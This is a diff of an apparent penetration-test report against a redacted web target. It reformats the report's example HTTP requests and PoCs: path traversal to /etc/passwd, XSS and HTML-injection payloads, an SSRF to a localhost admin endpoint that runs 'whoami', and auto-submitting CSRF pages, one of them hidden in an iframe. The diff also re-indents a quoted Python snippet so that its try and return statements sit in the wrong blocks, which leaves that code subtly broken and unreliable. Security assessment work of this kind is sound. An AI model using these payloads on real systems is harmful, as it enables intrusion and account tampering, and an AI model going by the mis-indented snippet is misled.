@@ -99,27 +99,27 @@ can read any file readable by the web server, including /etc/passwd,
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /data HTTP/2\
-  Host: \[TARGET-REDACTED\]\
+  ```POST /data HTTP/2
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
+  Firefox/128.0
   Accept:
-  text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Content-Type: application/x-www-form-urlencoded\
-  Content-Length: 54\
-  Origin: https://\[TARGET-REDACTED\]\
-  Referer: https://\[TARGET-REDACTED\]/data\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: \[REDACTED_EMAIL\]\
-  Priority: u=0, i\
-  Te: trailers\
-  \
+  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 54
+  Origin: https://[TARGET-REDACTED]
+  Referer: https://[TARGET-REDACTED]/data
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
+  Te: trailers
+  
   data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd
 ```
   -----------------------------------------------------------------------
@@ -171,27 +171,27 @@ HTML escaping, allowing injection of HTML and JavaScript.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /profile HTTP/2\
-  Host: **\[TARGET-REDACTED\]**\
+  ```POST /profile HTTP/2
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
+  Firefox/128.0
   Accept:
-  text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Content-Type: application/x-www-form-urlencoded\
-  Content-Length: 62\
-  Origin: https://**\[TARGET-REDACTED\]**\
-  Referer: https://**\[TARGET-REDACTED\]**/profile\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: **\[REDACTED_EMAIL\]**\
-  Priority: u=0, i\
-  Te: trailers\
-  \
+  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 62
+  Origin: https://[TARGET-REDACTED]
+  Referer: https://[TARGET-REDACTED]/profile
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
+  Te: trailers
+  
   username=AggroSec&bio=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
 ```
   -----------------------------------------------------------------------
@@ -240,21 +240,21 @@ onmouseover).
   --------------------------------------------------------------------------
   ```GET
   /search?search_term=%22+onmouseover%3Dalert%28document.domain%29+x%3D%22
-  HTTP/2\
-  Host: **\[TARGET-REDACTED\]**\
+  HTTP/2
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
-  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Referer: https://**\[TARGET-REDACTED\]**/search\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: **\[REDACTED_EMAIL\]**\
-  Priority: u=0, i\
+  Firefox/128.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Referer: https://[TARGET-REDACTED]/search
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
   Te: trailers
 ```
   --------------------------------------------------------------------------
@@ -297,8 +297,7 @@ Error messages leak the tool name and version.
 2.  Link to PDF document was clicked and observed through Burp, noting
     that the file path submitted to the pdf endpoint can be changed.
 
-3.  Submitted url=[[https://google.com]{.underline}](https://google.com)
-    and valid PDF returned
+3.  Submitted url=https://google.com and valid PDF returned
 
 4.  Submitted url=../../../etc/passwd and got a 500 response with
     "wkhtmltopdf exited with non-zero code 1"
@@ -313,28 +312,28 @@ Error messages leak the tool name and version.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /pdf HTTP/2\
-  \
-  Host: \[TARGET-REDACTED\]\
+  ```POST /pdf HTTP/2
+  
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
+  Firefox/128.0
   Accept:
-  text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Content-Type: application/x-www-form-urlencoded\
-  Content-Length: 61\
-  Origin: https://\[TARGET-REDACTED\]\
-  Referer: https://\[TARGET-REDACTED\]/\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: \[REDACTED_EMAIL\]\
-  Priority: u=0, i\
-  Te: trailers\
-  \
+  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 61
+  Origin: https://[TARGET-REDACTED]
+  Referer: https://[TARGET-REDACTED]/
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
+  Te: trailers
+  
   url=https://google.com
 ```
 
@@ -392,21 +391,20 @@ enabling arbitrary command execution as the nobody user.
 **Python Code Snip**
 
   -----------------------------------------------------------------------
-  ```\@app.route(\"/admin\", methods=\[\"GET\"\])\
-  def admin():\
-  if request.remote_addr not in \[\"127.0.0.1\", \"localhost\",
-  \"::1\"\]:\
-  return \"Access Denied\", 403\
-  \
-  if \"cmd\" in request.args:\
-  cmd = request.args\[\"cmd\"\]\
-  log_alert(\"Command Injection\", cmd)\
-  try:\
-  output = run_as_nobody(cmd).decode()\
-  except subprocess.CalledProcessError as e:\
-  output = f\"Command failed: {e}\"\
-  return render_template(\"admin.html\", output=output)\
-  return render_template(\"admin.html\", output=\"\")
+  ```@app.route("/admin", methods=["GET"])
+  def admin():
+      if request.remote_addr not in ["127.0.0.1", "localhost","::1"]:
+          return "Access Denied", 403
+  
+      if "cmd" in request.args:
+          cmd = request.args["cmd"]
+          log_alert("Command Injection", cmd)
+      try:
+          output = run_as_nobody(cmd).decode()
+      except subprocess.CalledProcessError as e:
+          output = f"Command failed: {e}"
+          return render_template("admin.html", output=output)
+      return render_template("admin.html", output="")
 ```
   -----------------------------------------------------------------------
 
@@ -417,27 +415,27 @@ enabling arbitrary command execution as the nobody user.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /pdf HTTP/2\
-  Host: \[TARGET-REDACTED\]\
+  ```POST /pdf HTTP/2
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
+  Firefox/128.0
   Accept:
-  text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Content-Type: application/x-www-form-urlencoded\
-  Content-Length: 20\
-  Origin: https://\[TARGET-REDACTED\]\
-  Referer: https://\[TARGET-REDACTED\]/\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: \[REDACTED_EMAIL\]\
-  Priority: u=0, i\
-  Te: trailers\
-  \
+  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 20
+  Origin: https://[TARGET-REDACTED]
+  Referer: https://[TARGET-REDACTED]/
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
+  Te: trailers
+  
   url=http://127.0.0.1/admin?cmd=whoami
 ```
   -----------------------------------------------------------------------
@@ -479,67 +477,67 @@ injecting malicious bio content.
 **PoCs**
 
   -----------------------------------------------------------------------
-  ```CSRF test\
-  \<!DOCTYPE html\>\
-  \<html\>\
-  \<head\>\<title\>CSRF Pure PoC\</title\>\</head\>\
-  \<body\>\
-  \<h3\>CSRF - Profile Overwrite (No XSS)\</h3\>\
-  \<form id=\"csrf\" action=\"https:/\[TARGET-REDACTED\]/profile\"
-  method=\"POST\"\>\
-  \<input name=\"username\" value=\"Admin\"\>\
-  \<input name=\"bio\" value=\"This profile was overwritten via CSRF\"\>\
-  \</form\>\
-  \<script\>\
-  // Auto-submit\
-  document.getElementById(\"csrf\").submit();\
-  \</script\>\
-  \</body\>\
-  \</html\>
+  ```CSRF test
+  <!DOCTYPE html>
+  <html>
+  <head><title>CSRF Pure PoC</title></head>
+  <body>
+  <h3>CSRF - Profile Overwrite (No XSS)</h3>
+  <form id="csrf" action="https:/[TARGET-REDACTED]/profile"
+  method="POST">
+  <input name="username" value="Admin">
+  <input name="bio" value="This profile was overwritten via CSRF">
+  </form>
+  <script>
+  // Auto-submit
+  document.getElementById("csrf").submit();
+  </script>
+  </body>
+  </html>
 ```
   -----------------------------------------------------------------------
-  ```CSRF chained with XSS\
-  \<!DOCTYPE html\>\
-  \<html\>\
-  \<body\>\
-  \<form id=\"chain\" action=\"https://\[TARGET-REDACTED\]/profile\"
-  method=\"POST\"\>\
-  \<input name=\"username\" value=\"admin\"\>\
-  \<input name=\"bio\"
-  value=\"\<script\>alert(\'CSRF+XSS\');\</script\>\"\>\
-  \</form\>\
-  \<script\>document.getElementById(\"chain\").submit();\</script\>\
-  \</body\>\
-  \</html\>
+  ```CSRF chained with XSS
+  <!DOCTYPE html>
+  <html>
+  <body>
+  <form id="chain" action="https://[TARGET-REDACTED]/profile"
+  method="POST">
+  <input name="username" value="admin">
+  <input name="bio"
+  value="<script>alert('CSRF+XSS');</script>">
+  </form>
+  <script>document.getElementById("chain").submit();</script>
+  </body>
+  </html>
 ```
   -----------------------------------------------------------------------
- ``` Silent Version\
-  \<!DOCTYPE html\>\
-  \<**html**\>\
-  \<**head**\>\
-  \<**title**\>Silent CSRF PoC\</**title**\>\
-  \<**style**\>\
-  body, iframe { display: none !important; }\
-  \</**style**\>\
-  \</**head**\>\
-  \<**body**\>\
-  \<**h2**\>CSRF activated (will not load page)\</**h2**\>\
-  \
-  \<**iframe** name=\"hidden\" style=\"display:none;\"\>\</**iframe**\>\
-  \
-  \<**form** id=\"csrf\"
-  action=\"https://**\[TARGET-REDACTED\]**/profile\"\
-  method=\"POST\" target=\"hidden\"\>\
-  \<**input** name=\"username\" value=\"CSRF_OWNED\"\>\
-  \<**input** name=\"bio\" value=\"Silent overwrite via CSRF\"\>\
-  \</**form**\>\
-  \
-  \<**script**\>\
-  // Submit silently in background\
-  document.getElementById(\"csrf\").submit();\
-  \</**script**\>\
-  \</**body**\>\
-  \</**html**\>
+ ``` Silent Version
+  <!DOCTYPE html>
+  <html>
+  <head>
+  <title>Silent CSRF PoC</title>
+  <style>
+  body, iframe { display: none !important; }
+  </style>
+  </head>
+  <body>
+  <h2>CSRF activated (will not load page)</h2>
+  
+  <iframe name="hidden" style="display:none;"></iframe>
+  
+  <form id="csrf"
+  action="https://[TARGET-REDACTED]/profile"
+  method="POST" target="hidden">
+  <input name="username" value="CSRF_OWNED">
+  <input name="bio" value="Silent overwrite via CSRF">
+  </form>
+  
+  <script>
+  // Submit silently in background
+  document.getElementById("csrf").submit();
+  </script>
+  </body>
+  </html>
 ```
   -----------------------------------------------------------------------
 
@@ -583,27 +581,27 @@ enabling defacement and potential phishing.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  ```POST /profile HTTP/2\
-  Host: \[TARGET-REDACTED\]\
+  ```POST /profile HTTP/2
+  Host: [TARGET-REDACTED]
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
-  Firefox/128.0\
+  Firefox/128.0
   Accept:
-  text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-  Accept-Language: en-US,en;q=0.5\
-  Accept-Encoding: gzip, deflate, br\
-  Content-Type: application/x-www-form-urlencoded\
-  Content-Length: 62\
-  Origin: https://\[TARGET-REDACTED\]\
-  Referer: https://\[TARGET-REDACTED\]/profile\
-  Upgrade-Insecure-Requests: 1\
-  Sec-Fetch-Dest: document\
-  Sec-Fetch-Mode: navigate\
-  Sec-Fetch-Site: same-origin\
-  Sec-Fetch-User: ?1\
-  X-Candidate-Email: \[REDACTED_EMAIL\]\
-  Priority: u=0, i\
-  Te: trailers\
-  \
+  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate, br
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 62
+  Origin: https://[TARGET-REDACTED]
+  Referer: https://[TARGET-REDACTED]/profile
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  X-Candidate-Email: [REDACTED_EMAIL]
+  Priority: u=0, i
+  Te: trailers
+  
   username=AggroSec&bio=%3Ch1%3EHACKED+by+AggroSec%3C%2Fh1%3E
 ```
   -----------------------------------------------------------------------
